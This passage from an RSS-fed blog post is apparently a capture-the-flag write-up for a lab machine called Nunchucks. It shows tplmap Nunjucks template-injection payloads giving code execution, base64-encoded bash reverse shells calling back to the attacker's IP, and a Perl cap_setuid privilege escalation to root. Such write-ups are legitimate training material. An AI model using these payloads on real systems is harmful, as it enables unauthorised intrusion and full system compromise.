+<span class="s2">&#34;LANG&#34;</span>:<span class="s2">&#34;en_GB.UTF-8&#34;</span>
+<span class="s2">&#34;HOME&#34;</span>:<span class="s2">&#34;/home/david&#34;</span>
+<span class="s2">&#34;MOTD_SHOWN&#34;</span>:<span class="s2">&#34;pam&#34;</span>
+<span class="s2">&#34;XDG_SESSION_TYPE&#34;</span>:<span class="s2">&#34;tty&#34;</span>
+<span class="s2">&#34;LOGNAME&#34;</span>:<span class="s2">&#34;david&#34;</span>
+<span class="s2">&#34;PWD&#34;</span>:<span class="s2">&#34;/var/www/store.nunchucks&#34;</span>
+<span class="s2">&#34;XDG_SEAT&#34;</span>:<span class="s2">&#34;seat0&#34;</span>
+<span class="s2">&#34;SHELL&#34;</span>:<span class="s2">&#34;/bin/bash&#34;</span>
+<span class="s2">&#34;PM2_HOME&#34;</span>:<span class="s2">&#34;/home/david/.pm2&#34;</span>
+<span class="s2">&#34;unique_id&#34;</span>:<span class="s2">&#34;cc712ea0-c7b6-40af-9a85-94d9a4fee31a&#34;</span>
+<span class="s2">&#34;status&#34;</span>:<span class="s2">&#34;launching&#34;</span>
+<span class="s2">&#34;pm_uptime&#34;</span>:1636123032873
+<span class="s2">&#34;axm_actions&#34;</span>:<span class="o">[]</span>
+<span class="s2">&#34;axm_monitor&#34;</span>:<span class="o">{}</span>
+<span class="s2">&#34;axm_options&#34;</span>:<span class="o">{}</span>
+<span class="s2">&#34;axm_dynamic&#34;</span>:<span class="o">{}</span>
+<span class="s2">&#34;created_at&#34;</span>:1633378615869
+<span class="s2">&#34;restart_time&#34;</span>:2
+<span class="s2">&#34;unstable_restarts&#34;</span>:0
+<span class="s2">&#34;_pm2_version&#34;</span>:<span class="s2">&#34;5.1.1&#34;</span>
+<span class="s2">&#34;version&#34;</span>:<span class="s2">&#34;1.0.0&#34;</span>
+<span class="s2">&#34;versioning&#34;</span>:null
+<span class="s2">&#34;node_version&#34;</span>:<span class="s2">&#34;10.19.0&#34;</span>
+<span class="s2">&#34;pm_id&#34;</span>:6
+<span class="s2">&#34;exit_code&#34;</span>:0<span class="o">}</span><span class="nv">NODE_UNIQUE_ID</span><span class="o">=</span><span class="nv">12NODE_CHANNEL_FD</span><span class="o">=</span><span class="m">3</span>
+</code></pre></div><p>Since I know the username, I can try to grab the flag now.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
+$ ./tplmap.py -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --download <span class="s1">&#39;/home/david/user.txt&#39;</span> <span class="s1">&#39;loot/user.txt&#39;</span>
+→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
+$ cat loot/user.txt
+bac81...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><h3 id="shell-as-david">Shell as david</h3>
+<h4 id="tpl-shell">TPL shell</h4>
+<p>With write access, I tried to drop my public key to <code>/home/david/.ssh/authorized_keys</code>, but didn&rsquo;t work. One possible thing is that there is no <code>.ssh</code> folder, and to create one I need code execution!</p>
+<p>After some hours, I tried the <code>--tpl-shell</code>, and using the <a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine">same blog</a> for syntax reference.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «tplmap» «10.10.14.46» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
+$ tplmap -u <span class="s1">&#39;http://127.0.0.1/?email=0mochi@iamf.htb&#39;</span> --engine Nunjucks --tpl-shell
+<span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
+    Automatic Server-Side Template Injection Detection and Exploitation Tool
+
+<span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;email&#39;</span> is injectable
+<span class="o">[</span>+<span class="o">]</span> Nunjucks plugin is testing rendering with tag <span class="s1">&#39;{{*}}&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Nunjucks plugin has confirmed injection with tag <span class="s1">&#39;{{*}}&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Tplmap identified the following injection point:
+
+  GET parameter: email
+  Engine: Nunjucks
+  Injection: <span class="o">{{</span>*<span class="o">}}</span>
+  Context: text
+  OS: linux
+  Technique: render
+  Capabilities:
+
+   Shell <span class="nb">command</span> execution: no
+   Bind and reverse shell: no
+   File write: ok
+   File read: ok
+   Code evaluation: ok, javascript code
+
+<span class="o">[</span>+<span class="o">]</span> Inject multi-line template code. Press ctrl-D to send the lines
+<span class="o">[</span>0<span class="o">]</span> nunjucks &gt;
+</code></pre></div><p>Previously <code>tplmap</code> identified that I didn&rsquo;t have code/OS command execution, but here&rsquo;s what I got when trying to create <code>.ssh</code> folder:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -la ~/.ssh&#39;)&#34;</span><span class="o">)()</span>
+<span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
+
+<span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;mkdir ~/.ssh&#39;)&#34;</span><span class="o">)()</span>
+<span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
+
+<span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -l ~/.ssh&#39;)&#34;</span><span class="o">)()</span>
+<span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
+total 0<span class="se">\n</span>
+</code></pre></div><p>I definitely can execute OS command 😮!</p>
+<h4 id="reverse-shell">Reverse shell</h4>
+<p>I tried to inject my SSH pubkey, but I got asked for a password. Therefore, I will use a bash reverse shell encoded in base64.</p>
+<p>The payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
+$ <span class="nb">echo</span> <span class="s1">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.46/53 0&gt;&amp;1&#34;&#39;</span> <span class="p">|</span> base64
+YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ni81MyAwPiYxIgo<span class="o">=</span>
+</code></pre></div><p>Now I&rsquo;ll put that payload to david&rsquo;s home, and execute it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ni81MyAwPiYxIgo= | base64 -d &gt; ~/.0mochi.sh &amp;&amp; chmod +x ~/.0mochi.sh&#39;)&#34;</span><span class="o">)()</span>
+<span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
+
+<span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -l ~/.0mochi.sh&#39;)&#34;</span><span class="o">)()</span>
+<span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
+-rwxr-xr-x <span class="m">1</span> david david <span class="m">50</span> Nov  <span class="m">5</span> 15:32 /home/david/.0mochi.sh<span class="se">\n</span>
+<span class="o">[</span>0<span class="o">]</span> nunjucks &gt; range.constructor<span class="o">(</span><span class="s2">&#34;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash ~/.0mochi.sh&#39;)&#34;</span><span class="o">)()</span>
+<span class="o">[</span>1<span class="o">]</span> nunjucks &gt; 
+</code></pre></div><p>On my listener.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
+$ nc -nvlp <span class="m">53</span>                                                      
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.10.14.46<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.122<span class="o">]</span> <span class="m">39352</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1009<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+david@nunchucks:/var/www/store.nunchucks$ id  
+id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>
+david@nunchucks:/var/www/store.nunchucks$
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>Under <code>/opt</code> there is a backup script written in Perl.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@nunchucks:/opt$ ls -la
+total <span class="m">16</span>
+drwxr-xr-x  <span class="m">3</span> root root <span class="m">4096</span> Oct <span class="m">28</span> 17:03 .
+drwxr-xr-x <span class="m">19</span> root root <span class="m">4096</span> Oct <span class="m">28</span> 17:03 ..
+-rwxr-xr-x  <span class="m">1</span> root root  <span class="m">838</span> Sep  <span class="m">1</span> 12:53 backup.pl
+drwxr-xr-x  <span class="m">2</span> root root <span class="m">4096</span> Oct <span class="m">28</span> 17:03 web_backups
+david@nunchucks:/opt$ ls web_backups/ -l
+total <span class="m">14944</span>
+-rw-rw-r-- <span class="m">1</span> root david <span class="m">7651273</span> Sep <span class="m">26</span> 01:06 backup_2021-09-26-1632618416.tar
+-rw-rw-r-- <span class="m">1</span> root david <span class="m">7651273</span> Sep <span class="m">26</span> 01:18 backup_2021-09-26-1632619104.tar
+</code></pre></div><p>The script code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="ch">#!/usr/bin/perl</span>
+<span class="k">use</span> <span class="nn">strict</span><span class="p">;</span>
+<span class="k">use</span> <span class="nn">POSIX</span> <span class="sx">qw(strftime)</span><span class="p">;</span>
+<span class="k">use</span> <span class="nn">DBI</span><span class="p">;</span>
+<span class="k">use</span> <span class="nn">POSIX</span> <span class="sx">qw(setuid)</span><span class="p">;</span> 
+<span class="nn">POSIX::</span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
+
+<span class="k">my</span> <span class="nv">$tmpdir</span>        <span class="o">=</span> <span class="s">&#34;/tmp&#34;</span><span class="p">;</span>
+<span class="k">my</span> <span class="nv">$backup_main</span> <span class="o">=</span> <span class="s">&#39;/var/www&#39;</span><span class="p">;</span>
+<span class="k">my</span> <span class="nv">$now</span> <span class="o">=</span> <span class="n">strftime</span><span class="p">(</span><span class="s">&#34;%Y-%m-%d-%s&#34;</span><span class="p">,</span> <span class="nb">localtime</span><span class="p">);</span>
+<span class="k">my</span> <span class="nv">$tmpbdir</span> <span class="o">=</span> <span class="s">&#34;$tmpdir/backup_$now&#34;</span><span class="p">;</span>
+
+<span class="k">sub</span> <span class="nf">printlog</span>
+<span class="p">{</span>
+    <span class="k">print</span> <span class="s">&#34;[&#34;</span><span class="p">,</span> <span class="n">strftime</span><span class="p">(</span><span class="s">&#34;%D %T&#34;</span><span class="p">,</span> <span class="nb">localtime</span><span class="p">),</span> <span class="s">&#34;] $_[0]\n&#34;</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">sub</span> <span class="nf">archive</span>
+<span class="p">{</span>
+    <span class="n">printlog</span> <span class="s">&#34;Archiving...&#34;</span><span class="p">;</span>
+    <span class="nb">system</span><span class="p">(</span><span class="s">&#34;/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2&gt;/dev/null&#34;</span><span class="p">);</span>
+    <span class="n">printlog</span> <span class="s">&#34;Backup complete in $tmpbdir/backup_$now.tar&#34;</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="vg">$&gt;</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">die</span> <span class="s">&#34;You must run this script as root.\n&#34;</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">printlog</span> <span class="s">&#34;Backup starts.&#34;</span><span class="p">;</span>
+<span class="nb">mkdir</span><span class="p">(</span><span class="nv">$tmpbdir</span><span class="p">);</span>
+<span class="o">&amp;</span><span class="n">archive</span><span class="p">;</span>
+<span class="n">printlog</span> <span class="s">&#34;Moving $tmpbdir/backup_$now to /opt/web_backups&#34;</span><span class="p">;</span>
+<span class="nb">system</span><span class="p">(</span><span class="s">&#34;/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/&#34;</span><span class="p">);</span>
+<span class="n">printlog</span> <span class="s">&#34;Removing temporary directory&#34;</span><span class="p">;</span>
+<span class="nb">rmdir</span><span class="p">(</span><span class="nv">$tmpbdir</span><span class="p">);</span>
+<span class="n">printlog</span> <span class="s">&#34;Completed&#34;</span><span class="p">;</span>
+</code></pre></div><p>When I run it, I found that I didn&rsquo;t fail in the first if statement, which checks for root priv (I guess).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@nunchucks:/opt$ ./backup.pl 
+<span class="o">[</span>11/05/21 15:56:43<span class="o">]</span> Backup starts.
+<span class="o">[</span>11/05/21 15:56:43<span class="o">]</span> Archiving...
+<span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Backup <span class="nb">complete</span> in /tmp/backup_2021-11-05-1636127803/backup_2021-11-05-1636127803.tar
+<span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Moving /tmp/backup_2021-11-05-1636127803/backup_2021-11-05-1636127803 to /opt/web_backups
+<span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Removing temporary directory
+<span class="o">[</span>11/05/21 15:56:44<span class="o">]</span> Completed
+david@nunchucks:/opt$ 
+</code></pre></div><p>A quick check on Perl capabilities reveals that it has <code>cap_setuid+ep</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@nunchucks:/tmp$ getcap <span class="k">$(</span>which perl<span class="k">)</span>
+/usr/bin/perl <span class="o">=</span> cap_setuid+ep
+</code></pre></div><h4 id="exploit-cap_setuidep">Exploit cap_setuid+ep</h4>
+<p>I tried the <a href="https://gtfobins.github.io/#perl">GTFObins</a> way to exploit the <code>cap_setuid</code> capability, but it didn&rsquo;t spawn me a root shell. However, executing <code>whoami</code> still shows that I&rsquo;m root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@nunchucks:/tmp$ /usr/bin/perl -e <span class="s1">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;/bin/bash&#34;;&#39;</span>
+david@nunchucks:/tmp$ /usr/bin/perl -e <span class="s1">&#39;use POSIX qw(setuid); POSIX::setuid(0); exec &#34;whoami&#34;;&#39;</span>
+root
+</code></pre></div><p>I also couldn&rsquo;t get the root flag, it returned with permission denied.</p>
+<p>The next thing I tried was reusing the backup script, but with all of the code except the header stripped off and I changed the system command for executing reverse shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">david@nunchucks:/tmp$ cat .0mochi.pl 
+<span class="c1">#!/usr/bin/perl</span>
+use strict<span class="p">;</span>
+use POSIX qw<span class="o">(</span>strftime<span class="o">)</span><span class="p">;</span>
+use DBI<span class="p">;</span>
+use POSIX qw<span class="o">(</span>setuid<span class="o">)</span><span class="p">;</span> 
+POSIX::setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span> 
+
+system<span class="o">(</span><span class="s2">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.46/53 0&gt;&amp;1&#39;&#34;</span><span class="o">)</span>
+david@nunchucks:/tmp$ chmod +x .0mochi.pl 
+</code></pre></div><p>And it worked!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «nunchucks» «10.10.14.46» 
+$ nc -nvlp <span class="m">53</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
+connect to <span class="o">[</span>10.10.14.46<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.122<span class="o">]</span> <span class="m">39386</span>
+root@nunchucks:/tmp# id
+id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20211105233721153.png" alt="image-20211105233721153"  /></div>
+</p>
+<p>The flag</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@nunchucks:/tmp# cat /root/root.txt
+cat /root/root.txt
+1d2cc...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div>]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
